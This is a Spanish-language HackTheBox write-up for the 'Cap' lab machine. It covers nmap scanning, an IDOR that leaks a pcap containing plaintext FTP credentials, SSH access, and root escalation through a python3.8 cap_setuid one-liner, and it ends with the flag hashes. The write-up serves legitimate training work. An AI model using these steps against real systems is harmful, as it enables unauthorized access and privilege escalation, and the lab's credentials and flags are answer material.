---
titulo: "Cap"
descripcion: "IDOR en dashboard de capturas de red expone pcap ajeno con credenciales FTP en texto plano. SSH como nathan. Privesc vía cap_setuid en Python3 (Linux capabilities)."
fecha: 2026-06-06
dificultad: easy
herramientas: ["nmap", "wireshark", "ssh", "python3"]
categoria: htb
plataforma: HackTheBox
completado: true
---

## Reconocimiento

Fase 1 — descubrimiento de puertos:

```bash
nmap -vvv -p- --open -sS --min-rate 5000 -n -Pn 10.129.19.218
```

Fase 2 — detección de versiones y scripts sobre los puertos encontrados:

```bash
nmap -p21,22,80 -sCV 10.129.19.218
```

Puertos abiertos:
- **21/tcp (vsftpd 3.0.3)**
- **22/tcp (OpenSSH 8.2p1 — Ubuntu)**
- **80/tcp (gunicorn)** — dashboard de seguridad de red

## Foothold

### IDOR en /data

El dashboard permite generar y descargar capturas de red. La URL de cada captura sigue el patrón:

```
http://10.129.19.218/data/0
```

El parámetro numérico no valida pertenencia — IDOR (Insecure Direct Object Reference). Accediendo a `/data/0` se obtiene una captura generada por otro usuario.

### Análisis del pcap

Se descarga el archivo `0.pcap` desde el botón de descarga y se abre con Wireshark.

El tráfico FTP viaja en texto plano y expone credenciales en la sesión capturada:

**Credenciales:** `nathan:Buck3tH4TF0RM3!`

### Acceso SSH

```bash
ssh nathan@10.129.19.218
```

Shell obtenida como `nathan`. Flag de usuario en `~/user.txt`.

## Escalada de Privilegios

Verificación de Linux capabilities sobre el sistema:

```bash
getcap -r / 2>/dev/null
```

Output relevante:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`cap_setuid` permite a Python3.8 cambiar el UID del proceso — incluyendo a UID 0 (root) — sin necesitar sudo ni SUID. Se aprovecha llamando a `os.setuid(0)` antes de spawnear una shell:

```bash
python3.8 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

Shell root obtenida.

```bash
cat /root/root.txt
```

## Flags

| Flag | Hash |
|------|------|
| User | `470087221128584d9f720ae7a1bcc0f8` |
| Root | `4f28ccb45b74546eb6e26e0cf336566b` |
